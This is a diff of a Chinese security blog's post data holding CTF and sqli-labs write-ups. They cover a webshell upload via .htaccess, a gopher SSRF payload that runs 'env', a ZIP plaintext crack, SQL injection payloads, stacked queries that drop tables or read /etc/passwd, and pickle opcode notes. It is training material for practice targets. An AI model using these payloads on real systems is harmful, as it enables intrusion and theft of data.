+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#define width 1337</span><br><span class="line">#define height 1337</span><br><span class="line">&lt;FilesMatch &quot;a.jpg&quot;&gt;</span><br><span class="line">    SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
+
+<p>上传，再写一个图片马上传，再用蚁剑连接找到flag就行了。</p>
+<h3 id="flag-1"><a href="#flag-1" class="headerlink" title="flag"></a>flag</h3><p>NSSCTF{09d16fca-9671-46e0-b912-3b5ef5621c53}</p>
+<h2 id="Goph3rrr"><a href="#Goph3rrr" class="headerlink" title="Goph3rrr"></a>Goph3rrr</h2><p>由提示，我们先访问&#x2F;app.py下载源码.查看发现</p>
+<p><img src="/../images/ad774e223c5624e0716c417260950908.png" alt="ad774e223c5624e0716c417260950908" loading="lazy"></p>
+<p><img src="/../images/56ee79c15351f94c4e78283e4a8bb371.png" alt="56ee79c15351f94c4e78283e4a8bb371" loading="lazy"></p>
+<p><img src="/../images/826d3e36771d059daf467bd565d31d51.png" alt="826d3e36771d059daf467bd565d31d51" loading="lazy"></p>
+<p>根据hint可以想到利用gopher的ssrf漏洞再利用manage读取文件，要利用Manage那么我们就需要绕过127.0.0.0的检测如果直接通过浏览器访问&#x2F;manage,会被拦截并返回forbidden，那么这时候我们就需要通过gopher访问本地服务再通过本地服务发送请求这样才不会拦截，那么我们就可以开始构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gopher://0:8000/_POST /Manage HTTP/1.1</span><br><span class="line">Host: 0:8000</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 7</span><br><span class="line"></span><br><span class="line">cmd=env</span><br></pre></td></tr></table></figure>
+
+<p>构造过程参考<a href="https://blog.csdn.net/shw_yzh/article/details/141601445">CTFHub-SSRF过关攻略_hackhub攻略-CSDN博客</a>，我们只需保留请求包需要的最基本的请求头，我们还需要编码两次，在向服务器发送请求时，首先浏览器会进行一次 URL解码，其次服务器收到请求后，在执行curl功能时，进行第二次 URL解码 。</p>
+<p>由于127.0.0.1在黑名单中，所以我们需要改为0来绕过(参考<a href="https://blog.csdn.net/m0_73756016/article/details/138632803">ssrf学习2——内网ip绕过_ssrf 127.0.0.1绕过-CSDN博客</a>) 且端口是8000，根据提示，flag在环境变量里，那么我们就利用env打开环境变量便能获取flag</p>
+<p>payload：<a href="http://node2.anna.nssctf.cn:28591/Gopher?url=gopher://0:8000/_POST%2520/Manage%2520HTTP/1.1%250D%250AHost%253A%25200%253A8000%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%25207%250D%250A%250D%250Acmd%253Denv%250D%250A">http://node2.anna.nssctf.cn:28591/Gopher?url=gopher%3A%2F%2F0%3A8000%2F_POST%2520/Manage%2520HTTP/1.1%250D%250AHost%253A%25200%253A8000%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%25207%250D%250A%250D%250Acmd%253Denv%250D%250A</a></p>
+<h3 id="flag：-2"><a href="#flag：-2" class="headerlink" title="flag："></a>flag：</h3><p>NSSCTF{d334ec08-1ce4-4395-baa1-472f5e91273b}</p>
+<h1 id="MISC-mybrave"><a href="#MISC-mybrave" class="headerlink" title="MISC mybrave"></a>MISC mybrave</h1><p>下载附件得到加密文件</p>
+<p>发现里面只有一个文件，结合提示明文攻击，那么我们就可以利用png固定的文件头进行破解</p>
+<p><code>89504E470D0A1A0A0000000D49484452</code>写成二进制文件，然后利用bkcrack进行密钥破解，得到密钥再把文件解密得到<img src="/../images/3.png" alt="3" loading="lazy"></p>
+<p>用vscode二进制打开发现IEND之后还有数据，利用ai生成python代码将数据分离</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">split_known_iend</span>(<span class="params">file_path, iend_pos</span>):</span><br><span class="line">    <span class="comment"># 读取文件内容</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    end_pos = iend_pos + <span class="number">8</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 分割数据</span></span><br><span class="line">    png_data = data[:end_pos]</span><br><span class="line">    extra_data = data[end_pos:]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> png_data, extra_data</span><br><span class="line">png_part, extra_part = split_known_iend(<span class="string">&quot;C:\\tools\\bkcrack-1.7.1-win64\\3.png&quot;</span>, <span class="number">0x107b29</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;clean.png&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(png_part)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;extra_data.bin&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(extra_part)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>，得到一个字符串<code>TlNTQ1RGe0knbV9XaDFzcDNyaU5nX091Ul9MdTExYWJZX2Ywcl9ZMHVfdG9fQ29NZV9CNGNrX0hvbWV9</code></p>
+<p>base64解码得到</p>
+<h3 id="flag-2"><a href="#flag-2" class="headerlink" title="flag"></a>flag</h3><p>NSSCTF{I’m_Wh1sp3riNg_OuR_Lu11abY_f0r_Y0u_to_CoMe_B4ck_Home}</p>
+]]></content>
+      <tags>
+        <tag>wp</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>less18-22</title>
     <url>/2024/11/24/less18-22/</url>
     <content><![CDATA[<h1 id="less18"><a href="#less18" class="headerlink" title="less18"></a>less18</h1><p>如果输入正确的账号密码，则页面回显你的ip与user-agent</p>
@@ -241,42 +259,6 @@
 <p>我们便可以得到想要的值。</p>
 <h1 id="less21-cookie"><a href="#less21-cookie" class="headerlink" title="less21(cookie)"></a>less21(cookie)</h1><p>同上，不过是括号加单引号闭合，且是base64编码。</p>
 <h1 id="less22-cookie"><a href="#less22-cookie" class="headerlink" title="less22(cookie)"></a>less22(cookie)</h1><p>同20，但是双引号</p>
-]]></content>
-      <tags>
-        <tag>sqlilab注入 web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>less23-27</title>
-    <url>/2025/01/14/less23-27/</url>
-    <content><![CDATA[<h1 id="less23"><a href="#less23" class="headerlink" title="less23"></a>less23</h1><p>尝试之前的get题的方法发现总是有语法错误，而且报错内容中多出一个引号，我们可以推断我们注释符号没有起作用，查看源码。</p>
-<p><img src="/../images/1736866487923.jpg" alt="1736866487923" loading="lazy"></p>
-<p>果然给干没了，既然不能注释掉多余的引号那么我们可以想到使用多个or来中和掉多出来的一个引号payload如下:</p>
-<p><code> ?id=2&#39;  or extractvalue(1,concat(0x7e,(select database()),0x7e)) or &#39;1&#39;=&#39;1</code></p>
-<p>成功。</p>
-<p><img src="/../images/1736866811069.jpg" alt="1736866811069" loading="lazy"></p>
-<h1 id="less24"><a href="#less24" class="headerlink" title="less24"></a>less24</h1><p>首先查找注入点</p>
-<p><img src="/../images/1738307969207.jpg" alt="1738307969207" loading="lazy"></p>
-<p>发现在登录和注册都有过滤，我们试着登录看看</p>
-<p><img src="/../images/1738308060203.jpg" alt="1738308060203" loading="lazy"></p>
-<p>发现能改密码，但也过滤了，无思路，我们看看源码。发现这里是用session获取的用户名且并没过滤，这就是注入点</p>
-<p><img src="/../images/1738308271201(1).jpg" alt="1738308271201(1)" loading="lazy"></p>
-<p><img src="/../images/1738308636055.jpg" alt="1738308636055" loading="lazy"></p>
-<p>这里的原理是注册一个危险字段的用户，由于通过session获取的时候没过滤，那么储存在session中的危险字段便能利用（这里注册时的转义只是暂时的）。</p>
-<p>我们讲用户名注册成例如这样</p>
-<p><code>admin&#39;#</code></p>
-<p>此时sql语句变成这样</p>
-<p><code>&quot;UPDATE users SET PASSWORD=&#39;$pass&#39; where username=&#39;admin&#39;#&#39; and password=&#39;$curr_pass&#39; &quot;</code></p>
-<p>那么#后面的语句便被注释了，也就是说我们不需要知道当下的密码便可以修改admin的密码。</p>
-<h1 id="less25-less25a"><a href="#less25-less25a" class="headerlink" title="less25&amp;less25a"></a>less25&amp;less25a</h1><p>由提示可知，”AND”和”OR”被过滤了，那么我们可以使用双写绕过。</p>
-<p><strong>双写绕过：</strong></p>
-<p>即讲“or”写成“OorR”，这样中间的“or”会被过滤掉，而“OR”则被留下，值得注意的是，如果在payload中的其他单词中也有“or”或者“and”的部分，则也要双写以防被过滤。</p>
-<p>less25a则是数字型注入，其余和less25差不多。</p>
-<h1 id="less26-less26a"><a href="#less26-less26a" class="headerlink" title="less26&amp;less26a"></a>less26&amp;less26a</h1><p>在这一关，除了or 和and被过滤，还有注释符和空格也被过滤了，那么我们可以利用其他的字符代替使用<strong>“%a0”</strong> 或<strong>“%0b”</strong> 替代空格，使用<strong>“||”</strong> 替代 “or”，使用<strong>“%26%26”</strong> 替代 “and”。</p>
-<p>26a不回显报错信息，所以我们只能让信息爆在显示位上。</p>
-<h1 id="less27-less27a"><a href="#less27-less27a" class="headerlink" title="less27&amp;less27a"></a>less27&amp;less27a</h1><p>or和and没被过滤，不过空格和注释符还有select和union被过滤了。我们可以用<strong>大小写过滤</strong>，即将大小写混杂，也可以使用报错注入来回显信息。</p>
-<p>27a报错无回显，那么就用大小写过滤。</p>
-<p>我们发现有些过滤语句后面的反斜杠上有m或s，这是什么意思呢，这是设定的修正符，修正符的具体效果参照下面这个链接：<br><a href="https://www.php.net/manual/zh/reference.pcre.pattern.modifiers.php#reference.pcre.pattern.modifiers">正则表达式中的修正符</a></p>
 ]]></content>
       <tags>
         <tag>sqlilab注入 web</tag>
@@ -388,33 +370,36 @@
       </tags>
   </entry>
   <entry>
-    <title>Hello World</title>
-    <url>/2024/08/04/hello-world/</url>
-    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-]]></content>
-  </entry>
-  <entry>
-    <title>less38-41</title>
-    <url>/2025/02/18/less38-41/</url>
-    <content><![CDATA[<p><strong>Less 38 ~ 41 虽然使用 Less 1 的方式注入即可注入成功，但是这 4 关存在堆叠注入漏洞。我们可以使用 “;” 闭合第一个 SQL 语句，然后在后面执行任意的 SQL 语句，通过这个漏洞我们可以对数据库执行任意的操作。</strong></p>
-<h1 id="less38"><a href="#less38" class="headerlink" title="less38"></a>less38</h1><h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><p>此处使用 Less 1 的 payload 就可以完成注入，此处用于测试堆叠注入。所谓<strong>堆叠注入</strong>就是在原语句后加上分号，从而闭合前面的内容作为第一条 SQL 语句。然后在后面输入第二条的数据库操作语句，在条件允许可以被后端带入数据库执行。堆叠注入使用的范围非常有限，例如后端可能会限制 SQL 只执行一条语句。一旦这种漏洞存在，对数据库的破坏性是毁灭性的，因为这表示攻击者可以肆意对数据库进行操作。</p>
-<p>堆叠注入攻击<br>堆叠查询注入攻击可以执行多条语句，多语句之间以分号隔开。堆叠查询注入就是利用这个特点，在第二个SQL语句中构造自己的要执行的语句<br>新建一个表<code>select * from users;create table A like users;</code><br>删除创建的A表<code>select * from users;drop table test;</code><br>查询数据<code>select * from users;select B,C,D;</code><br>加载文件<code>select * from users;select load_file(&#39;/etc/passwd&#39;);</code><br>增加一条数据<code>select * from users;insert into users values(18,&#39;zhong&#39;,&#39;zhong&#39;);</code></p>
-<p>查看源码发现源码使用了 <strong>mysqli_multi_query()</strong> 函数，该函数可以执行多个 MySQL 语句。之前的 Less 使用的是 <strong>mysql_query() 函数</strong>，该函数只执行一条 MySQL 查询。</p>
-<h1 id="less39"><a href="#less39" class="headerlink" title="less39"></a>less39</h1><p>和less38一样，不过是数值型注入。</p>
-<h1 id="less40"><a href="#less40" class="headerlink" title="less40"></a>less40</h1><p>也是堆叠注入不过是单引号和括号型。</p>
-<h1 id="less41"><a href="#less41" class="headerlink" title="less41"></a>less41</h1><p>和39差不多也是堆叠注入的数值型。</p>
+    <title>less23-27</title>
+    <url>/2025/01/14/less23-27/</url>
+    <content><![CDATA[<h1 id="less23"><a href="#less23" class="headerlink" title="less23"></a>less23</h1><p>尝试之前的get题的方法发现总是有语法错误，而且报错内容中多出一个引号，我们可以推断我们注释符号没有起作用，查看源码。</p>
+<p><img src="/../images/1736866487923.jpg" alt="1736866487923" loading="lazy"></p>
+<p>果然给干没了，既然不能注释掉多余的引号那么我们可以想到使用多个or来中和掉多出来的一个引号payload如下:</p>
+<p><code> ?id=2&#39;  or extractvalue(1,concat(0x7e,(select database()),0x7e)) or &#39;1&#39;=&#39;1</code></p>
+<p>成功。</p>
+<p><img src="/../images/1736866811069.jpg" alt="1736866811069" loading="lazy"></p>
+<h1 id="less24"><a href="#less24" class="headerlink" title="less24"></a>less24</h1><p>首先查找注入点</p>
+<p><img src="/../images/1738307969207.jpg" alt="1738307969207" loading="lazy"></p>
+<p>发现在登录和注册都有过滤，我们试着登录看看</p>
+<p><img src="/../images/1738308060203.jpg" alt="1738308060203" loading="lazy"></p>
+<p>发现能改密码，但也过滤了，无思路，我们看看源码。发现这里是用session获取的用户名且并没过滤，这就是注入点</p>
+<p><img src="/../images/1738308271201(1).jpg" alt="1738308271201(1)" loading="lazy"></p>
+<p><img src="/../images/1738308636055.jpg" alt="1738308636055" loading="lazy"></p>
+<p>这里的原理是注册一个危险字段的用户，由于通过session获取的时候没过滤，那么储存在session中的危险字段便能利用（这里注册时的转义只是暂时的）。</p>
+<p>我们讲用户名注册成例如这样</p>
+<p><code>admin&#39;#</code></p>
+<p>此时sql语句变成这样</p>
+<p><code>&quot;UPDATE users SET PASSWORD=&#39;$pass&#39; where username=&#39;admin&#39;#&#39; and password=&#39;$curr_pass&#39; &quot;</code></p>
+<p>那么#后面的语句便被注释了，也就是说我们不需要知道当下的密码便可以修改admin的密码。</p>
+<h1 id="less25-less25a"><a href="#less25-less25a" class="headerlink" title="less25&amp;less25a"></a>less25&amp;less25a</h1><p>由提示可知，”AND”和”OR”被过滤了，那么我们可以使用双写绕过。</p>
+<p><strong>双写绕过：</strong></p>
+<p>即讲“or”写成“OorR”，这样中间的“or”会被过滤掉，而“OR”则被留下，值得注意的是，如果在payload中的其他单词中也有“or”或者“and”的部分，则也要双写以防被过滤。</p>
+<p>less25a则是数字型注入，其余和less25差不多。</p>
+<h1 id="less26-less26a"><a href="#less26-less26a" class="headerlink" title="less26&amp;less26a"></a>less26&amp;less26a</h1><p>在这一关，除了or 和and被过滤，还有注释符和空格也被过滤了，那么我们可以利用其他的字符代替使用<strong>“%a0”</strong> 或<strong>“%0b”</strong> 替代空格，使用<strong>“||”</strong> 替代 “or”，使用<strong>“%26%26”</strong> 替代 “and”。</p>
+<p>26a不回显报错信息，所以我们只能让信息爆在显示位上。</p>
+<h1 id="less27-less27a"><a href="#less27-less27a" class="headerlink" title="less27&amp;less27a"></a>less27&amp;less27a</h1><p>or和and没被过滤，不过空格和注释符还有select和union被过滤了。我们可以用<strong>大小写过滤</strong>，即将大小写混杂，也可以使用报错注入来回显信息。</p>
+<p>27a报错无回显，那么就用大小写过滤。</p>
+<p>我们发现有些过滤语句后面的反斜杠上有m或s，这是什么意思呢，这是设定的修正符，修正符的具体效果参照下面这个链接：<br><a href="https://www.php.net/manual/zh/reference.pcre.pattern.modifiers.php#reference.pcre.pattern.modifiers">正则表达式中的修正符</a></p>
 ]]></content>
       <tags>
         <tag>sqlilab注入 web</tag>
@@ -481,6 +466,21 @@
       </tags>
   </entry>
   <entry>
+    <title>less38-41</title>
+    <url>/2025/02/18/less38-41/</url>
+    <content><![CDATA[<p><strong>Less 38 ~ 41 虽然使用 Less 1 的方式注入即可注入成功，但是这 4 关存在堆叠注入漏洞。我们可以使用 “;” 闭合第一个 SQL 语句，然后在后面执行任意的 SQL 语句，通过这个漏洞我们可以对数据库执行任意的操作。</strong></p>
+<h1 id="less38"><a href="#less38" class="headerlink" title="less38"></a>less38</h1><h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><p>此处使用 Less 1 的 payload 就可以完成注入，此处用于测试堆叠注入。所谓<strong>堆叠注入</strong>就是在原语句后加上分号，从而闭合前面的内容作为第一条 SQL 语句。然后在后面输入第二条的数据库操作语句，在条件允许可以被后端带入数据库执行。堆叠注入使用的范围非常有限，例如后端可能会限制 SQL 只执行一条语句。一旦这种漏洞存在，对数据库的破坏性是毁灭性的，因为这表示攻击者可以肆意对数据库进行操作。</p>
+<p>堆叠注入攻击<br>堆叠查询注入攻击可以执行多条语句，多语句之间以分号隔开。堆叠查询注入就是利用这个特点，在第二个SQL语句中构造自己的要执行的语句<br>新建一个表<code>select * from users;create table A like users;</code><br>删除创建的A表<code>select * from users;drop table test;</code><br>查询数据<code>select * from users;select B,C,D;</code><br>加载文件<code>select * from users;select load_file(&#39;/etc/passwd&#39;);</code><br>增加一条数据<code>select * from users;insert into users values(18,&#39;zhong&#39;,&#39;zhong&#39;);</code></p>
+<p>查看源码发现源码使用了 <strong>mysqli_multi_query()</strong> 函数，该函数可以执行多个 MySQL 语句。之前的 Less 使用的是 <strong>mysql_query() 函数</strong>，该函数只执行一条 MySQL 查询。</p>
+<h1 id="less39"><a href="#less39" class="headerlink" title="less39"></a>less39</h1><p>和less38一样，不过是数值型注入。</p>
+<h1 id="less40"><a href="#less40" class="headerlink" title="less40"></a>less40</h1><p>也是堆叠注入不过是单引号和括号型。</p>
+<h1 id="less41"><a href="#less41" class="headerlink" title="less41"></a>less41</h1><p>和39差不多也是堆叠注入的数值型。</p>
+]]></content>
+      <tags>
+        <tag>sqlilab注入 web</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>less50-53</title>
     <url>/2025/02/19/less50-53/</url>
     <content><![CDATA[<p><strong>Less 50 ~ 53 和 Less 46 ~ 49 的注入方法完全一样，但是这 4 个 Less 可以进行堆叠注入。</strong></p>
@@ -503,21 +503,6 @@
 <h1 id="less47"><a href="#less47" class="headerlink" title="less47"></a>less47</h1><p>和less46差不多，不过是单引号闭合</p>
 <h1 id="less48"><a href="#less48" class="headerlink" title="less48"></a>less48</h1><p>数值型，但没有错误信息回显，我们可以用时间盲注。</p>
 <h1 id="less49"><a href="#less49" class="headerlink" title="less49"></a>less49</h1><p>和less48差不多，不过是单引号闭合。</p>
-]]></content>
-      <tags>
-        <tag>sqlilab注入 web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>less42-45</title>
-    <url>/2025/02/19/less42-45/</url>
-    <content><![CDATA[<p><strong>Less 42 ~ 45 是使用 POST 提交参数的登录界面，username 字段进行了参数过滤，但是 password 字段没有。此处可以在 password 字段使用万能密码直接夺取用户，也可以在该字段处使用堆叠注入。</strong></p>
-<h1 id="less42"><a href="#less42" class="headerlink" title="less42"></a>less42</h1><p>在用户名使用万能密码测试，全部都登录失败。</p>
-<p>在密码字段使用万能密码测试，使用单引号闭合时登录成功。说明用户名参数注入时存在过滤，密码字段存在单引号闭合的字符型注入。</p>
-<p>可以在已知某个用户的用户名的条件下使用万能密码夺取用户，也可以使用二次注入进行攻击。由于密码参数没有进行防御，可以在该字段测试堆叠注入。使用 Less 38 的测试流程，每次登陆时完成一步堆叠注入。</p>
-<h1 id="less43"><a href="#less43" class="headerlink" title="less43"></a>less43</h1><p>和less42一样，不过是单引号和括号闭合。</p>
-<h1 id="less44"><a href="#less44" class="headerlink" title="less44"></a>less44</h1><p>和less42一样</p>
-<h1 id="less45"><a href="#less45" class="headerlink" title="less45"></a>less45</h1><p>和less43一样</p>
 ]]></content>
       <tags>
         <tag>sqlilab注入 web</tag>
@@ -567,11 +552,364 @@
       </tags>
   </entry>
   <entry>
+    <title>less42-45</title>
+    <url>/2025/02/19/less42-45/</url>
+    <content><![CDATA[<p><strong>Less 42 ~ 45 是使用 POST 提交参数的登录界面，username 字段进行了参数过滤，但是 password 字段没有。此处可以在 password 字段使用万能密码直接夺取用户，也可以在该字段处使用堆叠注入。</strong></p>
+<h1 id="less42"><a href="#less42" class="headerlink" title="less42"></a>less42</h1><p>在用户名使用万能密码测试，全部都登录失败。</p>
+<p>在密码字段使用万能密码测试，使用单引号闭合时登录成功。说明用户名参数注入时存在过滤，密码字段存在单引号闭合的字符型注入。</p>
+<p>可以在已知某个用户的用户名的条件下使用万能密码夺取用户，也可以使用二次注入进行攻击。由于密码参数没有进行防御，可以在该字段测试堆叠注入。使用 Less 38 的测试流程，每次登陆时完成一步堆叠注入。</p>
+<h1 id="less43"><a href="#less43" class="headerlink" title="less43"></a>less43</h1><p>和less42一样，不过是单引号和括号闭合。</p>
+<h1 id="less44"><a href="#less44" class="headerlink" title="less44"></a>less44</h1><p>和less42一样</p>
+<h1 id="less45"><a href="#less45" class="headerlink" title="less45"></a>less45</h1><p>和less43一样</p>
+]]></content>
+      <tags>
+        <tag>sqlilab注入 web</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>sqlmap</title>
     <url>/2025/02/28/sqlmap/</url>
     <content><![CDATA[]]></content>
       <tags>
         <tag>sqlmap</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ez_pickle知识深挖</title>
+    <url>/2025/03/11/pickle%E7%9F%A5%E8%AF%86%E5%88%9D%E6%8E%A2/</url>
+    <content><![CDATA[<h1 id="pickle"><a href="#pickle" class="headerlink" title="pickle"></a>pickle</h1><p>第一次见到这种类型的题，遂记录增长见识。</p>
+<h2 id="什么是pickle"><a href="#什么是pickle" class="headerlink" title="什么是pickle"></a>什么是pickle</h2><p>pickle是python中的一个标准模块，也被称为“腌制”和“卸腌”，用于将python对象转换为一个字节流，也就是序列化，并且以二进制格式储存，同时也可以把对象从字节流恢复成python对象。值得注意的是，使用pickle序列化的数据只能由pickle反序列化，并不能跨语言。</p>
+<h2 id="可序列化的对象"><a href="#可序列化的对象" class="headerlink" title="可序列化的对象"></a>可序列化的对象</h2><ol>
+<li><strong>基本数据类型</strong>：<ul>
+<li>整型（int）</li>
+<li>浮点型（float）</li>
+<li>复数（complex）</li>
+<li>字符串（str）</li>
+<li>字节串（bytes）</li>
+<li>字节数组（bytearray）</li>
+<li>布尔值（bool）</li>
+</ul>
+</li>
+<li><strong>容器类型</strong>：<ul>
+<li>列表（list）</li>
+<li>元组（tuple）</li>
+<li>字典（dict）</li>
+<li>集合（set）和冻结集合（frozenset）</li>
+</ul>
+</li>
+<li><strong>None</strong>：Python 的 <code>None</code> 值可以被 pickle。</li>
+<li><strong>函数、类和实例</strong>：用户定义的函数、类以及它们的实例可以被 pickle，但有一些限制。例如，函数和类定义所在的代码必须能够在反序列化时被导入。</li>
+<li><strong>内置类型实例</strong>：许多 Python 的内置类型实例，如 <code>datetime</code> 对象，也可以被 pickle。</li>
+</ol>
+<h2 id="主要函数"><a href="#主要函数" class="headerlink" title="主要函数"></a>主要函数</h2><ul>
+<li><code>pickle.dump(obj, file, protocol)</code>：将对象序列化并写入文件。</li>
+<li><code>pickle.load(file)</code>：从文件中读取并反序列化对象。</li>
+<li><code>pickle.dumps(obj)</code>：返回对象序列化后的结果。</li>
+<li><code>pickle.loads(bytes)</code>：从字节流中读取并且反序列化对象。</li>
+</ul>
+<h2 id="opcode"><a href="#opcode" class="headerlink" title="opcode"></a>opcode</h2><p><code>opcode</code> 是 “operation code” 的缩写，它指的是一个指令集中的一个操作码或操作码，pickle由于有不同的实现版本，在py3和py2中得到的opcode不相同。但是pickle可以向下兼容（所以用v0就可以在所有版本中执行），工作原理大致如下（白嫖的图）</p>
+<p><img src="/../images/20200320230711-7972c0ea-6abc-1.gif" alt="20200320230711-7972c0ea-6abc-1" loading="lazy"></p>
+<p>常用的opcode如下：</p>
+<table>
+<thead>
+<tr>
+<th>opcode</th>
+<th>描述</th>
+<th>具体写法</th>
+<th>栈上的变化</th>
+<th>memo上的变化</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>c</td>
+<td>获取一个全局对象或import一个模块（注：会调用import语句，能够引入新的包）</td>
+<td>c[module]\n[instance]\n</td>
+<td>获得的对象入栈</td>
+<td>无</td>
+</tr>
+<tr>
+<td>o</td>
+<td>寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）</td>
+<td>o</td>
+<td>这个过程中涉及到的数据都出栈，函数的返回值（或生成的对象）入栈</td>
+<td>无</td>
+</tr>
+<tr>
+<td>i</td>
+<td>相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）</td>
+<td>i[module]\n[callable]\n</td>
+<td>这个过程中涉及到的数据都出栈，函数返回值（或生成的对象）入栈</td>
+<td>无</td>
+</tr>
+<tr>
+<td>N</td>
+<td>实例化一个None</td>
+<td>N</td>
+<td>获得的对象入栈</td>
+<td>无</td>
+</tr>
+<tr>
+<td>S</td>
+<td>实例化一个字符串对象</td>
+<td>S’xxx’\n（也可以使用双引号、&#39;等python字符串形式）</td>
+<td>获得的对象入栈</td>
+<td>无</td>
+</tr>
+<tr>
+<td>V</td>
+<td>实例化一个UNICODE字符串对象</td>
+<td>Vxxx\n</td>
+<td>获得的对象入栈</td>
+<td>无</td>
+</tr>
+<tr>
+<td>I</td>
+<td>实例化一个int对象</td>
+<td>Ixxx\n</td>
+<td>获得的对象入栈</td>
+<td>无</td>
+</tr>
+<tr>
+<td>F</td>
+<td>实例化一个float对象</td>
+<td>Fx.x\n</td>
+<td>获得的对象入栈</td>
+<td>无</td>
+</tr>
+<tr>
+<td>R</td>
+<td>选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数</td>
+<td>R</td>
+<td>函数和参数出栈，函数的返回值入栈</td>
+<td>无</td>
+</tr>
+<tr>
+<td>.</td>
+<td>程序结束，栈顶的一个元素作为pickle.loads()的返回值</td>
+<td>.</td>
+<td>无</td>
+<td>无</td>
+</tr>
+<tr>
+<td>(</td>
+<td>向栈中压入一个MARK标记</td>
+<td>(</td>
+<td>MARK标记入栈</td>
+<td>无</td>
+</tr>
+<tr>
+<td>t</td>
+<td>寻找栈中的上一个MARK，并组合之间的数据为元组</td>
+<td>t</td>
+<td>MARK标记以及被组合的数据出栈，获得的对象入栈</td>
+<td>无</td>
+</tr>
+<tr>
+<td>)</td>
+<td>向栈中直接压入一个空元组</td>
+<td>)</td>
+<td>空元组入栈</td>
+<td>无</td>
+</tr>
+<tr>
+<td>l</td>
+<td>寻找栈中的上一个MARK，并组合之间的数据为列表</td>
+<td>l</td>
+<td>MARK标记以及被组合的数据出栈，获得的对象入栈</td>
+<td>无</td>
+</tr>
+<tr>
+<td>]</td>
+<td>向栈中直接压入一个空列表</td>
+<td>]</td>
+<td>空列表入栈</td>
+<td>无</td>
+</tr>
+<tr>
+<td>d</td>
+<td>寻找栈中的上一个MARK，并组合之间的数据为字典（数据必须有偶数个，即呈key-value对）</td>
+<td>d</td>
+<td>MARK标记以及被组合的数据出栈，获得的对象入栈</td>
+<td>无</td>
+</tr>
+<tr>
+<td>}</td>
+<td>向栈中直接压入一个空字典</td>
+<td>}</td>
+<td>空字典入栈</td>
+<td>无</td>
+</tr>
+<tr>
+<td>p</td>
+<td>将栈顶对象储存至memo_n</td>
+<td>pn\n</td>
+<td>无</td>
+<td>对象被储存</td>
+</tr>
+<tr>
+<td>g</td>
+<td>将memo_n的对象压栈</td>
+<td>gn\n</td>
+<td>对象被压栈</td>
+<td>无</td>
+</tr>
+<tr>
+<td>0</td>
+<td>丢弃栈顶对象</td>
+<td>0</td>
+<td>栈顶对象被丢弃</td>
+<td>无</td>
+</tr>
+<tr>
+<td>b</td>
+<td>使用栈中的第一个元素（储存多个属性名: 属性值的字典）对第二个元素（对象实例）进行属性设置</td>
+<td>b</td>
+<td>栈上第一个元素出栈</td>
+<td>无</td>
+</tr>
+<tr>
+<td>s</td>
